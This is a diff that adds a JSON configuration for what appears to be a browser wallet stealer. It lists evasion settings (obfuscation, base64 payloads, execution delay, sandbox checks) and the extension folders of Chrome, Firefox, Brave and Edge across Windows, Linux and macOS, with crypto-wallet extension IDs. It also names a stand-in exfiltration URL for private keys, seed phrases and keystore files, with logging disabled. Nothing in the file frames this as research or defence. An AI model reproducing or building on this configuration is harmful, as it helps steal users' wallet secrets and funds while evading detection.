@@ -1,0 +1,60 @@
+{
+  "evasion_parameters": {
+    "string_concatenation": true,
+    "unicode_escape_sequences": true,
+    "dynamic_function_generation": true,
+    "obfuscation_level": "high",
+    "payload_encoding": "base64",
+    "execution_delay_ms": 5000,
+    "environment_check": true
+  },
+  "target_extension_paths": [
+    {
+      "browser": "chrome",
+      "os": "windows",
+      "base_path": "C:\\Users\\%USERNAME%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extensions",
+      "target_extension_ids": ["nkbihfbeogaeaoehlefnkodbefgpgknn", "ejbalbakoplchlghecdalmeeeajnimhm", "hpglfhgfnhbgpjdenjgmdgoeiappafln"]
+    },
+    {
+      "browser": "firefox",
+      "os": "windows",
+      "base_path": "C:\\Users\\%USERNAME%\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles",
+      "target_extension_ids": ["webextension@metamask.io", "{d634138d-c276-4fc8-924b-40a0ea21d284}"]
+    },
+    {
+      "browser": "brave",
+      "os": "windows",
+      "base_path": "C:\\Users\\%USERNAME%\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Extensions",
+      "target_extension_ids": ["nkbihfbeogaeaoehlefnkodbefgpgknn", "odbfpeeihdkbihmopkbjmoonfanlbfcl"]
+    },
+    {
+      "browser": "chrome",
+      "os": "linux",
+      "base_path": "/home/%USER%/.config/google-chrome/Default/Extensions",
+      "target_extension_ids": ["nkbihfbeogaeaoehlefnkodbefgpgknn", "ejbalbakoplchlghecdalmeeeajnimhm"]
+    },
+    {
+      "browser": "chrome",
+      "os": "macos",
+      "base_path": "/Users/%USER%/Library/Application Support/Google/Chrome/Default/Extensions",
+      "target_extension_ids": ["nkbihfbeogaeaoehlefnkodbefgpgknn", "hpglfhgfnhbgpjdenjgmdgoeiappafln"]
+    },
+    {
+      "browser": "edge",
+      "os": "windows",
+      "base_path": "C:\\Users\\%USERNAME%\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Extensions",
+      "target_extension_ids": ["ejbalbakoplchlghecdalmeeeajnimhm", "odbfpeeihdkbihmopkbjmoonfanlbfcl"]
+    }
+  ],
+  "payload_configuration": {
+    "exfiltration_url": "https://exfil.example.com/collect",
+    "target_data": ["private_keys", "seed_phrases", "keystore_files", "browser_storage"],
+    "injection_method": "content_script_override",
+    "trigger_event": "wallet_connect"
+  },
+  "logging": {
+    "enabled": false,
+    "log_file": "debug.log",
+    "log_level": "error"
+  }
+}
